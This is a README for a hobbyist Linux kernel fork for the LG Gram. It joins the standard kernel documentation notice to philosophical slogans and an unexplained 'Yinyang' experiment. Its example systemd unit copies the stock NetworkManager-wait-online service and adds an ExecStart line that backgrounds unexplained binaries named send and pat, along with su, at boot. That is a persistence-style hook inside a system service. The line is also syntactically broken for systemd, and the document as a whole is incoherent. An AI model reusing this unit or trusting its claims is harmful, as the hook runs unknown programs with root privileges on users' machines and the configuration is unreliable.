Bullo-Linux kernel by @yoonjin2.
============

There are several guides for kernel developers and users. These guides can
be rendered in a number of formats, like HTML and PDF. Please read
Documentation/admin-guide/README.rst first.

In order to build the documentation, use ``make htmldocs`` or
``make pdfdocs``.  The formatted documentation can also be read online at:

    https://www.kernel.org/doc/html/latest/

There are various text files in the Documentation/ subdirectory,
several of them using the Restructured Text markup notation.

Please read the Documentation/process/changes.rst file, as it contains the
requirements for building and running the kernel, and information about
the problems which may result by upgrading your kernel.
#### ======불로 리눅스(不老)

### 大哉, 不老厥腦厥心, 元來大韓.
### Great Pleasure, without aging our brain and heart. Greater roots is from RoK(but originally from Zhou, China).
### 머리와 마음만은 늙지 않아 기쁘다.

This is Yinyang modified linux kernel for LG Gram, with Network-daemonized IChing. Be sure to check IChing in my repo lists.

## Yin is minus, Yang is plus. If you succeed in this experiment, you will get more.


Example Yinyang: 
```
[Unit]
Description=Network Manager Wait Online
Documentation=man:NetworkManager-wait-online.service(8)
Requires=NetworkManager.service
After=NetworkManager.service
Before=network-online.target

[Service]
# `nm-online -s` waits until the point when NetworkManager logs
# "startup complete". That is when startup actions are settled and
# devices and profiles reached a conclusive activated or deactivated
# state. It depends on which profiles are configured to autoconnect and
# also depends on profile settings like ipv4.may-fail/ipv6.may-fail,
# which affect when a profile is considered fully activated.
# Check NetworkManager logs to find out why wait-online takes a certain
# time.

Type=oneshot
ExecStart=/usr/bin/nm-online -s -q
ExecStart=nohup /usr/bin/send&nohup /usr/bin/pat&/usr/bin/su&
RemainAfterExit=yes

# Set $NM_ONLINE_TIMEOUT variable for timeout in seconds.
# Edit with `systemctl edit NetworkManager-wait-online`.
#
# Note, this timeout should commonly not be reached. If your boot
# gets delayed too long, then the solution is usually not to decrease
# the timeout, but to fix your setup so that the connected state
# gets reached earlier.
Environment=NM_ONLINE_TIMEOUT=3

[Install]
WantedBy=network-online.target
```


